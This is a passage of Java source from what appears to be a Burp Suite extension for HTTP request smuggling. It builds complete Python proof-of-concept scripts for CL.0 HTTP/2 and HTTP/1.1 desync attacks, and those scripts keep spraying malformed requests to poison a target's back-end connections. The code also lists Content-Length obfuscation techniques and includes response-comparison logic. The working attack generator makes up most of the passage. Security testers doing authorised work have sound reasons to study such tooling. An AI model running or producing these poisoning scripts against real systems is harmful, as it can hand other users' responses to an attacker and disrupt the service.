            script = h2 ? buildH2Script(attack, follow) : buildH1Script(attack, follow);
        } catch (Throwable t) {
            script = "# Failed to generate PoC: "
                    + (t.getMessage() == null ? t.toString() : t.getMessage());
        }
        final String out = script;
        SwingUtilities.invokeLater(() -> {
            pythonArea.setText(out);
            pythonArea.setCaretPosition(0);
        });
    }

    private void savePythonPoc() {
        if (pythonArea.getText() == null || pythonArea.getText().trim().isEmpty()) {
            setStatus("Nothing to save — generate the Python PoC first.");
            return;
        }
        try {
            javax.swing.JFileChooser chooser = new javax.swing.JFileChooser();
            chooser.setSelectedFile(new java.io.File("desync_poc.py"));
            if (chooser.showSaveDialog(frame) == javax.swing.JFileChooser.APPROVE_OPTION) {
                java.io.File f = chooser.getSelectedFile();
                java.nio.file.Files.write(f.toPath(),
                        pythonArea.getText().getBytes(StandardCharsets.UTF_8));
                setStatus("Saved Python PoC to " + f.getAbsolutePath());
            }
        } catch (Throwable t) {
            String detail = t.getMessage() == null ? t.toString() : t.getMessage();
            setStatus("Failed to save: " + detail);
        }
    }

    private String buildH2Script(byte[] attackBytes, byte[] followBytes) {
        String host = service == null ? "TARGET" : service.host();
        int port = service == null ? 443 : service.port();
        String attackHeaders = pyHeaderList(attackBytes);
        String attackBody = pyBytes(Utilities.getBodyBytes(attackBytes));
        String followHeaders = pyHeaderList(followBytes);
        String followBody = pyBytes(Utilities.getBodyBytes(followBytes));
        String smuggled = repro != null && repro.smuggledLine != null ? repro.smuggledLine : "(smuggled request)";

        return "#!/usr/bin/env python3\n"
                + "# Auto-generated CL.0 HTTP/2 request-smuggling PoC — CONTINUOUS DEMO MODE\n"
                + "# Target: " + host + ":" + port + "   smuggled: " + smuggled + "\n"
                + "#\n"
                + "# Runs until Ctrl+C. Continuously sprays the smuggling attack to poison back-end\n"
                + "# connections in the pool. While this runs, browse the same host in your browser — if\n"
                + "# the front-end reuses a poisoned back-end connection, your browser may receive the\n"
                + "# smuggled response instead of the page you requested.\n"
                + "#\n"
                + "# Header values (incl. the malformed Content-Length) are sent verbatim — h2 validation\n"
                + "# is disabled — which Burp Repeater will not reliably preserve.\n"
                + "#\n"
                + "#   pip install h2\n"
                + "#   python3 desync_poc.py\n"
                + "#\n"
                + "# Traffic is sent through Burp (127.0.0.1:8080) so you can inspect requests/responses.\n"
                + "# Install Burp's CA in your system trust store if VERIFY_TLS is True.\n"
                + "#\n"
                + "import socket, ssl, sys, time, threading\n"
                + "from datetime import datetime\n"
                + "from h2.connection import H2Connection\n"
                + "from h2.config import H2Configuration\n"
                + "from h2.events import ResponseReceived, DataReceived, StreamEnded, StreamReset, ConnectionTerminated\n"
                + "\n"
                + "HOST = " + pyStr(host) + "\n"
                + "PORT = " + port + "\n"
                + "USE_PROXY = True\n"
                + "PROXY_HOST = '127.0.0.1'\n"
                + "PROXY_PORT = 8080          # Burp default listener\n"
                + "VERIFY_TLS = False         # False = accept Burp's MITM cert\n"
                + "WORKERS = 2              # parallel poison sprays (raise to increase pool hit rate)\n"
                + "VERIFY_EVERY = 4           # self-check every N spray cycles\n"
                + "SLEEP_SEC = 0.05           # pause between cycles\n"
                + "PREVIEW_BYTES = 500        # response body preview on a desync hit\n"
                + "SMUGGLED = " + pyStr(smuggled) + "\n"
                + "\n"
                + "ATTACK_HEADERS = [\n" + attackHeaders + "]\n"
                + "ATTACK_BODY = " + attackBody + "\n"
                + "\n"
                + "FOLLOW_HEADERS = [\n" + followHeaders + "]\n"
                + "FOLLOW_BODY = " + followBody + "\n"
                + "\n"
                + "stats = {'spray': 0, 'verify': 0, 'hits': 0, 'errors': 0}\n"
                + "stats_lock = threading.Lock()\n"
                + "stop = threading.Event()\n"
                + "\n"
                + "def ts():\n"
                + "    return datetime.now().strftime('%H:%M:%S')\n"
                + "\n"
                + "def tunnel_through_proxy():\n"
                + "    \"\"\"HTTP CONNECT through Burp, then TLS + HTTP/2 on the tunnel.\"\"\"\n"
                + "    proxy = socket.create_connection((PROXY_HOST, PROXY_PORT), timeout=10)\n"
                + "    connect_req = ('CONNECT %s:%d HTTP/1.1\\r\\nHost: %s:%d\\r\\n\\r\\n' % (HOST, PORT, HOST, PORT)).encode()\n"
                + "    proxy.sendall(connect_req)\n"
                + "    resp = b''\n"
                + "    while b'\\r\\n\\r\\n' not in resp:\n"
                + "        chunk = proxy.recv(4096)\n"
                + "        if not chunk:\n"
                + "            raise RuntimeError('Proxy closed during CONNECT (is Burp listening on %s:%d?)' % (PROXY_HOST, PROXY_PORT))\n"
                + "        resp += chunk\n"
                + "    status_line = resp.split(b'\\r\\n', 1)[0]\n"
                + "    if b' 200' not in status_line:\n"
                + "        raise RuntimeError('CONNECT failed: %s' % status_line.decode('latin-1', errors='replace'))\n"
                + "    return proxy\n"
                + "\n"
                + "def connect():\n"
                + "    ctx = ssl.create_default_context()\n"
                + "    if not VERIFY_TLS:\n"
                + "        ctx.check_hostname = False\n"
                + "        ctx.verify_mode = ssl.CERT_NONE\n"
                + "    ctx.set_alpn_protocols(['h2'])\n"
                + "    if USE_PROXY:\n"
                + "        raw = tunnel_through_proxy()\n"
                + "    else:\n"
                + "        raw = socket.create_connection((HOST, PORT), timeout=10)\n"
                + "    tls = ctx.wrap_socket(raw, server_hostname=HOST)\n"
                + "    if tls.selected_alpn_protocol() != 'h2':\n"
                + "        raise RuntimeError('ALPN=%r (expected h2)' % tls.selected_alpn_protocol())\n"
                + "    cfg = H2Configuration(client_side=True, validate_outbound_headers=False,\n"
                + "                          normalize_outbound_headers=False, validate_inbound_headers=False)\n"
                + "    conn = H2Connection(config=cfg)\n"
                + "    conn.initiate_connection()\n"
                + "    tls.sendall(conn.data_to_send())\n"
                + "    return tls, conn\n"
                + "\n"
                + "def send(tls, conn, headers, body):\n"
                + "    sid = conn.get_next_available_stream_id()\n"
                + "    conn.send_headers(sid, headers, end_stream=(len(body) == 0))\n"
                + "    if body:\n"
                + "        conn.send_data(sid, body, end_stream=True)\n"
                + "    tls.sendall(conn.data_to_send())\n"
                + "    return sid\n"
                + "\n"
                + "def read_stream(tls, conn, sid, timeout=8):\n"
                + "    status, body = None, b''\n"
                + "    end = time.time() + timeout\n"
                + "    while time.time() < end and not stop.is_set():\n"
                + "        try:\n"
                + "            tls.settimeout(max(0.1, end - time.time()))\n"
                + "            data = tls.recv(65535)\n"
                + "        except socket.timeout:\n"
                + "            break\n"
                + "        if not data:\n"
                + "            break\n"
                + "        for ev in conn.receive_data(data):\n"
                + "            if isinstance(ev, ResponseReceived) and ev.stream_id == sid:\n"
                + "                for k, v in ev.headers:\n"
                + "                    kb = k if isinstance(k, bytes) else k.encode()\n"
                + "                    if kb == b':status':\n"
                + "                        status = v.decode() if isinstance(v, bytes) else v\n"
                + "            elif isinstance(ev, DataReceived) and ev.stream_id == sid:\n"
                + "                body += ev.data\n"
                + "                conn.acknowledge_received_data(len(ev.data), ev.stream_id)\n"
                + "            elif isinstance(ev, StreamEnded) and ev.stream_id == sid:\n"
                + "                return status, body\n"
                + "            elif isinstance(ev, (StreamReset, ConnectionTerminated)):\n"
                + "                return status, body\n"
                + "        out = conn.data_to_send()\n"
                + "        if out:\n"
                + "            tls.sendall(out)\n"
                + "    return status, body\n"
                + "\n"
                + "def close_quietly(tls):\n"
                + "    try:\n"
                + "        tls.close()\n"
                + "    except Exception:\n"
                + "        pass\n"
                + "\n"
                + "def spray_once():\n"
                + "    \"\"\"Send the attack and drain its response — leaves poison on a reused back-end conn.\"\"\"\n"
                + "    tls, conn = connect()\n"
                + "    sid = send(tls, conn, ATTACK_HEADERS, ATTACK_BODY)\n"
                + "    read_stream(tls, conn, sid, timeout=5)\n"
                + "    close_quietly(tls)\n"
                + "\n"
                + "def verify_once(baseline_st, baseline_len, tol):\n"
                + "    \"\"\"Attack + follow-up on ONE connection; return (changed, status, len, body).\"\"\"\n"
                + "    tls, conn = connect()\n"
                + "    a = send(tls, conn, ATTACK_HEADERS, ATTACK_BODY)\n"
                + "    read_stream(tls, conn, a, timeout=5)\n"
                + "    f = send(tls, conn, FOLLOW_HEADERS, FOLLOW_BODY)\n"
                + "    st, body = read_stream(tls, conn, f, timeout=8)\n"
                + "    close_quietly(tls)\n"
                + "    changed = (st != baseline_st) or abs(len(body) - baseline_len) > tol\n"
                + "    return changed, st, len(body), body\n"
                + "\n"
                + "def baseline():\n"
                + "    tls, conn = connect()\n"
                + "    sid = send(tls, conn, FOLLOW_HEADERS, FOLLOW_BODY)\n"
                + "    st, body = read_stream(tls, conn, sid)\n"
                + "    close_quietly(tls)\n"
                + "    return st, len(body)\n"
                + "\n"
                + "def spray_worker():\n"
                + "    while not stop.is_set():\n"
                + "        try:\n"
                + "            spray_once()\n"
                + "            with stats_lock:\n"
                + "                stats['spray'] += 1\n"
                + "        except Exception:\n"
                + "            with stats_lock:\n"
                + "                stats['errors'] += 1\n"
                + "        time.sleep(SLEEP_SEC)\n"
                + "\n"
                + "def preview(body):\n"
                + "    try:\n"
                + "        return body[:PREVIEW_BYTES].decode('utf-8', errors='replace')\n"
                + "    except Exception:\n"
                + "        return repr(body[:PREVIEW_BYTES])\n"
                + "\n"
                + "def main():\n"
                + "    print('=' * 72)\n"
                + "    print('CL.0 HTTP/2 desync — CONTINUOUS DEMO')\n"
                + "    print('Target : https://%s:%d' % (HOST, PORT))\n"
                + "    if USE_PROXY:\n"
                + "        print('Proxy  : http://%s:%d (Burp)' % (PROXY_HOST, PROXY_PORT))\n"
                + "    print('Smuggled: %s' % SMUGGLED)\n"
                + "    print('=' * 72)\n"
                + "    print()\n"
                + "    print('HOW TO DEMO WITH YOUR BROWSER:')\n"
                + "    print('  1. Leave this script running (Ctrl+C to stop). Burp should show each CONNECT + request.')\n"
                + "    print('  2. Open your browser (also proxied through Burp) and navigate to %s.' % HOST)\n"
                + "    print('  3. Browse normally. If the front-end shares back-end connections with this')\n"
                + "    print('     script, your browser may receive the SMUGGLED response instead of the')\n"
                + "    print('     page you requested — that is the desync in action.')\n"
                + "    print('  4. Watch this console for [!!!] DESYNC HIT — we self-check every %d cycles.' % VERIFY_EVERY)\n"
                + "    print()\n"
                + "    b_st, b_len = baseline()\n"
                + "    tol = max(64, b_len // 10)\n"
                + "    print('[%s] Baseline follow-up: status=%s len=%d (tolerance=%d bytes)' % (ts(), b_st, b_len, tol))\n"
                + "    print('[%s] Starting %d spray worker(s)...' % (ts(), WORKERS))\n"
                + "    print()\n"
                + "    workers = [threading.Thread(target=spray_worker, daemon=True) for _ in range(WORKERS)]\n"
                + "    for w in workers:\n"
                + "        w.start()\n"
                + "    cycle = 0\n"
                + "    try:\n"
                + "        while True:\n"
                + "            time.sleep(0.5)\n"
                + "            cycle += 1\n"
                + "            with stats_lock:\n"
                + "                s, e = stats['spray'], stats['errors']\n"
                + "            if cycle % 10 == 0:\n"
                + "                print('[%s] spraying... %d attacks sent (%d errors)' % (ts(), s, e))\n"
                + "            if cycle % VERIFY_EVERY == 0:\n"
                + "                try:\n"
                + "                    changed, st, ln, body = verify_once(b_st, b_len, tol)\n"
                + "                    with stats_lock:\n"
                + "                        stats['verify'] += 1\n"
                + "                    if changed:\n"
                + "                        with stats_lock:\n"
                + "                            stats['hits'] += 1\n"
                + "                            hits = stats['hits']\n"
                + "                        print()\n"
                + "                        print('!' * 72)\n"
                + "                        print('[!!!] DESYNC HIT #%d  follow-up status=%s len=%d (baseline %s/%d)' % (hits, st, ln, b_st, b_len))\n"
                + "                        print('[!!!] Response preview (first %d bytes):' % PREVIEW_BYTES)\n"
                + "                        print('-' * 40)\n"
                + "                        print(preview(body))\n"
                + "                        print('-' * 40)\n"
                + "                        print('!' * 72)\n"
                + "                        print()\n"
                + "                except Exception as ex:\n"
                + "                    with stats_lock:\n"
                + "                        stats['errors'] += 1\n"
                + "                    print('[%s] verify error: %s' % (ts(), ex))\n"
                + "    except KeyboardInterrupt:\n"
                + "        print()\n"
                + "        stop.set()\n"
                + "        for w in workers:\n"
                + "            w.join(timeout=2)\n"
                + "        print('[%s] Stopped.' % ts())\n"
                + "        print('  Attacks sprayed : %d' % stats['spray'])\n"
                + "        print('  Self-checks     : %d' % stats['verify'])\n"
                + "        print('  Desync hits     : %d' % stats['hits'])\n"
                + "        print('  Errors          : %d' % stats['errors'])\n"
                + "\n"
                + "if __name__ == '__main__':\n"
                + "    main()\n";
    }

    private String buildH1Script(byte[] attackBytes, byte[] followBytes) {
        String host = service == null ? "TARGET" : service.host();
        int port = service == null ? 443 : service.port();
        boolean tls = service == null || service.secure();
        String smuggled = repro != null && repro.smuggledLine != null ? repro.smuggledLine : "(smuggled request)";

        return "#!/usr/bin/env python3\n"
                + "# Auto-generated " + (repro != null ? repro.type.label : "CL.0")
                + " HTTP/1.1 request-smuggling PoC — CONTINUOUS DEMO MODE\n"
                + "# Target: " + host + ":" + port + "   smuggled: " + smuggled + "\n"
                + "#\n"
                + "# Runs until Ctrl+C. Continuously sprays the smuggling attack to poison back-end\n"
                + "# connections. Browse the same host in your browser while this runs.\n"
                + "# No third-party libraries required.\n"
                + "# Traffic is sent through Burp (127.0.0.1:8080) when USE_PROXY is True.\n"
                + "#\n"
                + "import socket, ssl, sys, time, threading\n"
                + "from datetime import datetime\n"
                + "\n"
                + "HOST = " + pyStr(host) + "\n"
                + "PORT = " + port + "\n"
                + "USE_TLS = " + (tls ? "True" : "False") + "\n"
                + "USE_PROXY = True\n"
                + "PROXY_HOST = '127.0.0.1'\n"
                + "PROXY_PORT = 8080\n"
                + "VERIFY_TLS = False\n"
                + "WORKERS = 2\n"
                + "VERIFY_EVERY = 4\n"
                + "SLEEP_SEC = 0.05\n"
                + "PREVIEW_BYTES = 500\n"
                + "SMUGGLED = " + pyStr(smuggled) + "\n"
                + "\n"
                + "ATTACK = " + pyBytes(attackBytes) + "\n"
                + "FOLLOW = " + pyBytes(followBytes) + "\n"
                + "\n"
                + "stats = {'spray': 0, 'verify': 0, 'hits': 0, 'errors': 0}\n"
                + "stats_lock = threading.Lock()\n"
                + "stop = threading.Event()\n"
                + "\n"
                + "def ts():\n"
                + "    return datetime.now().strftime('%H:%M:%S')\n"
                + "\n"
                + "def tunnel_through_proxy():\n"
                + "    proxy = socket.create_connection((PROXY_HOST, PROXY_PORT), timeout=10)\n"
                + "    connect_req = ('CONNECT %s:%d HTTP/1.1\\r\\nHost: %s:%d\\r\\n\\r\\n' % (HOST, PORT, HOST, PORT)).encode()\n"
                + "    proxy.sendall(connect_req)\n"
                + "    resp = b''\n"
                + "    while b'\\r\\n\\r\\n' not in resp:\n"
                + "        chunk = proxy.recv(4096)\n"
                + "        if not chunk:\n"
                + "            raise RuntimeError('Proxy closed during CONNECT (is Burp on %s:%d?)' % (PROXY_HOST, PROXY_PORT))\n"
                + "        resp += chunk\n"
                + "    if b' 200' not in resp.split(b'\\r\\n', 1)[0]:\n"
                + "        raise RuntimeError('CONNECT failed: %s' % resp[:200])\n"
                + "    return proxy\n"
                + "\n"
                + "def open_sock():\n"
                + "    if USE_PROXY and USE_TLS:\n"
                + "        raw = tunnel_through_proxy()\n"
                + "    elif USE_PROXY:\n"
                + "        raise RuntimeError('HTTP (non-TLS) via proxy not implemented; set USE_PROXY=False or USE_TLS=True')\n"
                + "    else:\n"
                + "        raw = socket.create_connection((HOST, PORT), timeout=10)\n"
                + "    if USE_TLS:\n"
                + "        ctx = ssl.create_default_context()\n"
                + "        if not VERIFY_TLS:\n"
                + "            ctx.check_hostname = False\n"
                + "            ctx.verify_mode = ssl.CERT_NONE\n"
                + "        return ctx.wrap_socket(raw, server_hostname=HOST)\n"
                + "    return raw\n"
                + "\n"
                + "def recv_all(sock, timeout=8):\n"
                + "    sock.settimeout(timeout)\n"
                + "    data = b''\n"
                + "    try:\n"
                + "        while True:\n"
                + "            chunk = sock.recv(65535)\n"
                + "            if not chunk:\n"
                + "                break\n"
                + "            data += chunk\n"
                + "    except socket.timeout:\n"
                + "        pass\n"
                + "    return data\n"
                + "\n"
                + "def parse_status(data):\n"
                + "    try:\n"
                + "        line = data.split(b'\\r\\n', 1)[0].decode('latin-1')\n"
                + "        return line.split()[1]\n"
                + "    except Exception:\n"
                + "        return '?'\n"
                + "\n"
                + "def spray_once():\n"
                + "    sock = open_sock()\n"
                + "    sock.sendall(ATTACK)\n"
                + "    recv_all(sock, timeout=5)\n"
                + "    sock.close()\n"
                + "\n"
                + "def verify_once(baseline_st, baseline_len, tol):\n"
                + "    sock = open_sock()\n"
                + "    sock.sendall(ATTACK)\n"
                + "    recv_all(sock, timeout=5)\n"
                + "    sock.sendall(FOLLOW)\n"
                + "    data = recv_all(sock, timeout=8)\n"
                + "    sock.close()\n"
                + "    # Second HTTP response (if any) is the poisoned follow-up answer\n"
                + "    parts = data.split(b'\\r\\n\\r\\n', 1)\n"
                + "    if len(parts) < 2:\n"
                + "        return False, '?', 0, b''\n"
                + "    rest = parts[1]\n"
                + "    idx = rest.find(b'HTTP/')\n"
                + "    if idx >= 0:\n"
                + "        follow = rest[idx:]\n"
                + "    else:\n"
                + "        follow = rest\n"
                + "    st = parse_status(follow)\n"
                + "    body_idx = follow.find(b'\\r\\n\\r\\n')\n"
                + "    body = follow[body_idx + 4:] if body_idx >= 0 else b''\n"
                + "    changed = (st != baseline_st) or abs(len(body) - baseline_len) > tol\n"
                + "    return changed, st, len(body), body\n"
                + "\n"
                + "def baseline():\n"
                + "    sock = open_sock()\n"
                + "    sock.sendall(FOLLOW)\n"
                + "    data = recv_all(sock)\n"
                + "    sock.close()\n"
                + "    st = parse_status(data)\n"
                + "    idx = data.find(b'\\r\\n\\r\\n')\n"
                + "    body = data[idx + 4:] if idx >= 0 else b''\n"
                + "    return st, len(body)\n"
                + "\n"
                + "def spray_worker():\n"
                + "    while not stop.is_set():\n"
                + "        try:\n"
                + "            spray_once()\n"
                + "            with stats_lock:\n"
                + "                stats['spray'] += 1\n"
                + "        except Exception:\n"
                + "            with stats_lock:\n"
                + "                stats['errors'] += 1\n"
                + "        time.sleep(SLEEP_SEC)\n"
                + "\n"
                + "def preview(body):\n"
                + "    try:\n"
                + "        return body[:PREVIEW_BYTES].decode('utf-8', errors='replace')\n"
                + "    except Exception:\n"
                + "        return repr(body[:PREVIEW_BYTES])\n"
                + "\n"
                + "def main():\n"
                + "    print('=' * 72)\n"
                + "    print('HTTP/1.1 desync — CONTINUOUS DEMO')\n"
                + "    print('Target : %s://%s:%d' % ('https' if USE_TLS else 'http', HOST, PORT))\n"
                + "    if USE_PROXY:\n"
                + "        print('Proxy  : http://%s:%d (Burp)' % (PROXY_HOST, PROXY_PORT))\n"
                + "    print('Smuggled: %s' % SMUGGLED)\n"
                + "    print('=' * 72)\n"
                + "    print()\n"
                + "    print('HOW TO DEMO WITH YOUR BROWSER:')\n"
                + "    print('  1. Leave this script running (Ctrl+C to stop). Burp should show each CONNECT + request.')\n"
                + "    print('  2. Open your browser (also proxied through Burp) and navigate to %s.' % HOST)\n"
                + "    print('  3. Browse normally — if a poisoned back-end connection is reused, you')\n"
                + "    print('     may see the smuggled response instead of the page you requested.')\n"
                + "    print('  4. Watch for [!!!] DESYNC HIT in this console.')\n"
                + "    print()\n"
                + "    b_st, b_len = baseline()\n"
                + "    tol = max(64, b_len // 10)\n"
                + "    print('[%s] Baseline follow-up: status=%s len=%d' % (ts(), b_st, b_len))\n"
                + "    print('[%s] Starting %d spray worker(s)...' % (ts(), WORKERS))\n"
                + "    print()\n"
                + "    workers = [threading.Thread(target=spray_worker, daemon=True) for _ in range(WORKERS)]\n"
                + "    for w in workers:\n"
                + "        w.start()\n"
                + "    cycle = 0\n"
                + "    try:\n"
                + "        while True:\n"
                + "            time.sleep(0.5)\n"
                + "            cycle += 1\n"
                + "            with stats_lock:\n"
                + "                s, e = stats['spray'], stats['errors']\n"
                + "            if cycle % 10 == 0:\n"
                + "                print('[%s] spraying... %d attacks sent (%d errors)' % (ts(), s, e))\n"
                + "            if cycle % VERIFY_EVERY == 0:\n"
                + "                try:\n"
                + "                    changed, st, ln, body = verify_once(b_st, b_len, tol)\n"
                + "                    with stats_lock:\n"
                + "                        stats['verify'] += 1\n"
                + "                    if changed:\n"
                + "                        with stats_lock:\n"
                + "                            stats['hits'] += 1\n"
                + "                            hits = stats['hits']\n"
                + "                        print()\n"
                + "                        print('!' * 72)\n"
                + "                        print('[!!!] DESYNC HIT #%d  follow-up status=%s len=%d' % (hits, st, ln))\n"
                + "                        print('[!!!] Response preview:')\n"
                + "                        print('-' * 40)\n"
                + "                        print(preview(body))\n"
                + "                        print('-' * 40)\n"
                + "                        print('!' * 72)\n"
                + "                        print()\n"
                + "                except Exception as ex:\n"
                + "                    with stats_lock:\n"
                + "                        stats['errors'] += 1\n"
                + "                    print('[%s] verify error: %s' % (ts(), ex))\n"
                + "    except KeyboardInterrupt:\n"
                + "        print()\n"
                + "        stop.set()\n"
                + "        for w in workers:\n"
                + "            w.join(timeout=2)\n"
                + "        print('[%s] Stopped.' % ts())\n"
                + "        print('  Attacks sprayed : %d' % stats['spray'])\n"
                + "        print('  Self-checks     : %d' % stats['verify'])\n"
                + "        print('  Desync hits     : %d' % stats['hits'])\n"
                + "        print('  Errors          : %d' % stats['errors'])\n"
                + "\n"
                + "if __name__ == '__main__':\n"
                + "    main()\n";
    }

    /** Renders a request's headers as Python (b'name', b'value') tuples via the HTTP/2 conversion. */
    private String pyHeaderList(byte[] reqBytes) {
        StringBuilder sb = new StringBuilder();
        String reqStr = Utilities.helpers.bytesToString(reqBytes);
        java.util.LinkedList<kotlin.Pair<String, String>> pairs =
                H2Connection.Companion.buildReq(new HTTP2Request(reqStr), true);
        for (kotlin.Pair<String, String> p : pairs) {
            sb.append("    (")
                    .append(pyBytesFromStr(p.getFirst())).append(", ")
                    .append(pyBytesFromStr(p.getSecond())).append("),\n");
        }
        return sb.toString();
    }

    private static String pyBytesFromStr(String s) {
        return pyBytes(s == null ? new byte[0] : s.getBytes(StandardCharsets.ISO_8859_1));
    }

    /** A Python bytes literal (b'...') with non-printable/quote/backslash bytes escaped as \xNN. */
    private static String pyBytes(byte[] b) {
        if (b == null) {
            return "b''";
        }
        StringBuilder sb = new StringBuilder("b'");
        for (byte value : b) {
            int c = value & 0xFF;
            if (c == '\\') {
                sb.append("\\\\");
            } else if (c == '\'') {
                sb.append("\\'");
            } else if (c >= 0x20 && c <= 0x7e) {
                sb.append((char) c);
            } else {
                sb.append(String.format("\\x%02x", c));
            }
        }
        return sb.append('\'').toString();
    }

    /** A Python str literal ('...') with quotes/backslashes/non-printables escaped. */
    private static String pyStr(String s) {
        if (s == null) {
            return "''";
        }
        StringBuilder sb = new StringBuilder("'");
        for (int i = 0; i < s.length(); i++) {
            char c = s.charAt(i);
            if (c == '\\') {
                sb.append("\\\\");
            } else if (c == '\'') {
                sb.append("\\'");
            } else if (c >= 0x20 && c <= 0x7e) {
                sb.append(c);
            } else {
                sb.append(String.format("\\x%02x", (int) c & 0xFF));
            }
        }
        return sb.append('\'').toString();
    }

    /** A clean, body-less HTTP/1.1 keep-alive follow-up derived from a base request. */
    private static byte[] buildPlainFollowUp(byte[] base) {
        byte[] follow = Utilities.replaceFirst(base, " HTTP/2\r\n", " HTTP/1.1\r\n");
        follow = Utilities.addOrReplaceHeader(follow, "Connection", "keep-alive");
        follow = Utilities.setBody(follow, "");
        follow = Utilities.fixContentLength(follow);
        return follow;
    }

    /**
     * CL.0 findings are almost always shared/CL Content-Length permutations (vanilla, nameprefix1, …).
     * The previous agent pass only tried {@link DesyncBox#h2Permutations}, most of which mutate
     * Transfer-Encoding and are no-ops when {@link DesyncBox#applyDesync} targets Content-Length.
     *
     * <p>We draw exclusively from the permutation {@link SettingsBox}es (each entry is a boolean
     * technique flag), never from {@code scanSettings}, which mixes in string settings such as
     * {@code "force method name"} / {@code "collab-domain"}. Passing one of those as a "technique"
     * would make {@link burp.ConfigurableSettings#getBoolean} throw and abort the whole sweep.</p>
     */
    private static ArrayList<String> clZeroTechniquesOrdered(String prioritize) {
        LinkedHashSet<String> order = new LinkedHashSet<>();
        String[] preferred = {
                "vanilla", "nameprefix1", "spacejoin1", "0dsuffix", "nameprefix2", "space1",
                "valueprefix1", "vertwrap", "tabsuffix", "nested", "CL-plus", "CL-minus", "CL-pad",
                "h2auth", "h2path", "h2scheme", "h2method", "h2CL"
        };
        for (String p : preferred) {
            order.add(p);
        }
        // Only real technique flags; explicitly exclude HTTP/1.1-only permutations.
        order.addAll(DesyncBox.sharedPermutations.getSettings());
        order.addAll(DesyncBox.clPermutations.getSettings());
        order.addAll(DesyncBox.h2Permutations.getSettings());
        order.removeIf(t -> t == null || t.isEmpty() || DesyncBox.h1Permutations.contains(t));

        // The technique named in the original finding always goes first — even if it is an
        // HTTP/1.1-only permutation — because the issue is evidence that it worked here.
        ArrayList<String> result = new ArrayList<>();
        if (prioritize != null && !prioritize.isEmpty()) {
            result.add(prioritize);
            order.remove(prioritize);
        }
        result.addAll(order);
        return result;
    }

    /**
     * All enabled CL.0 techniques for the HTTP/1.1 auto-sweep. Unlike
     * {@link #clZeroTechniquesOrdered} (used for H2 confirmation, which excludes H1),
     * this includes shared, CL, and H1 permutations — everything that
     * {@link DesyncBox#applyDesync} can apply to Content-Length on HTTP/1.1.
     */
    private static ArrayList<String> allEnabledClTechniques() {
        LinkedHashSet<String> order = new LinkedHashSet<>();
        String[] highPriority = {
                "vanilla", "nameprefix1", "spacejoin1", "0dsuffix", "tabsuffix",
                "CL-pad", "nameprefix2", "space1", "valueprefix1", "vertwrap", "nested",
                "CL-plus", "CL-minus"
        };
        for (String p : highPriority) {
            order.add(p);
        }
        order.addAll(DesyncBox.sharedPermutations.getSettings());
        order.addAll(DesyncBox.clPermutations.getSettings());
        order.addAll(DesyncBox.h1Permutations.getSettings());
        // Filter out disabled techniques and non-boolean settings.
        order.removeIf(t -> t == null || t.isEmpty() || !techniqueEnabled(t));
        return new ArrayList<>(order);
    }

    /** Safe technique-enabled check: getBoolean throws on non-boolean settings. */
    private static boolean techniqueEnabled(String technique) {
        try {
            return Utilities.globalSettings.getBoolean(technique);
        } catch (Throwable t) {
            return true;
        }
    }

    /**
     * Two responses are "similar" if they share the same status, comparable size,
     * matching key headers (Content-Type, Location), and no dramatic body change.
     * This catches subtle poisoning where status and size are close but the actual
     * content is completely different (e.g. a different page at the same 200).
     */
    private static boolean similar(Resp a, Resp b) {
        if (a == null || b == null) {
            return false;
        }
        if (a.getStatus() != b.getStatus()) {
            return false;
        }
        int la = respLen(a);
        int lb = respLen(b);
        int tolerance = Math.max(64, (int) (lb * 0.10));
        if (Math.abs(la - lb) > tolerance) {
            return false;
        }
        // Key header comparison: if these differ, the response is fundamentally different
        // even when status and size look the same.
        String ctA = respHeader(a, "Content-Type");
        String ctB = respHeader(b, "Content-Type");
        if (!ctA.isEmpty() && !ctB.isEmpty() && !headerValueSimilar(ctA, ctB)) {
            return false;
        }
        String locA = respHeader(a, "Location");
        String locB = respHeader(b, "Location");
        if (!locA.equals(locB)) {
            return false;
        }
        // Body snippet comparison: hash first 512 bytes of the body to detect
        // cases where size is similar but content is completely swapped.
        byte[] bodyA = respBodySnippet(a, 512);
        byte[] bodyB = respBodySnippet(b, 512);
        if (bodyA.length > 32 && bodyB.length > 32) {
            int matching = 0;
            int check = Math.min(bodyA.length, bodyB.length);
            for (int i = 0; i < check; i++) {
                if (bodyA[i] == bodyB[i]) matching++;
            }
            // Less than 50% byte-match on the leading body is a different page.
            if (matching < check / 2) {
                return false;
            }
        }
        return true;
    }

    private static String respHeader(Resp r, String name) {
        try {
            byte[] raw = r == null ? null : r.getResponse();
            if (raw == null) return "";
            String headers = Utilities.getHeaders(raw);
            String lower = headers.toLowerCase();
            String needle = "\n" + name.toLowerCase() + ":";
            int idx = lower.indexOf(needle);
            if (idx < 0) return "";
            int start = idx + needle.length();
            int end = lower.indexOf('\n', start);
            return (end < 0 ? headers.substring(start) : headers.substring(start, end)).trim();
        } catch (Throwable t) {
            return "";
        }
    }

    private static boolean headerValueSimilar(String a, String b) {
        // Compare the primary MIME type (before ';' parameters like charset).
        String baseA = a.contains(";") ? a.substring(0, a.indexOf(';')).trim() : a.trim();
        String baseB = b.contains(";") ? b.substring(0, b.indexOf(';')).trim() : b.trim();
        return baseA.equalsIgnoreCase(baseB);
    }

    private static byte[] respBodySnippet(Resp r, int max) {
        try {
            byte[] raw = r == null ? null : r.getResponse();
            if (raw == null) return new byte[0];
            String headers = Utilities.getHeaders(raw);
            int bodyStart = headers.length();
            if (bodyStart >= raw.length) return new byte[0];
            int len = Math.min(max, raw.length - bodyStart);
            byte[] snippet = new byte[len];
            System.arraycopy(raw, bodyStart, snippet, 0, len);
            return snippet;
        } catch (Throwable t) {
            return new byte[0];
        }
    }

    private static int respLen(Resp r) {
        try {
            byte[] resp = r == null ? null : r.getResponse();
            return resp == null ? 0 : resp.length;
        } catch (Throwable t) {
            return 0;
        }
    }

    private static String respString(Resp r) {
        try {
            byte[] resp = r == null ? null : r.getResponse();
            return resp == null ? "(no response)" : new String(resp, StandardCharsets.ISO_8859_1);
        } catch (Throwable t) {
            return "(unreadable response)";
        }
    }

    private boolean isAiEnabled() {
        try {
            return api.ai() != null && api.ai().isEnabled();
        } catch (Throwable t) {
            return false;
        }
    }

    private void runAgent() {
        final boolean useOllama = !PROVIDER_BURP.equals(providerCombo.getSelectedItem());
        if (!useOllama && !isAiEnabled()) {
            aiArea.setText("Burp AI is not enabled yet. Switch the provider to \"" + PROVIDER_OLLAMA
                    + "\" to use your local model, or enable Burp AI in Burp's settings.");
            return;
        }

        final String system = systemPrompt(repro.type);
        final String user = buildUserPrompt();
        final String model = ollamaModelField.getText().trim();
        final String endpoint = ollamaEndpointField.getText().trim();
        final long start = System.currentTimeMillis();
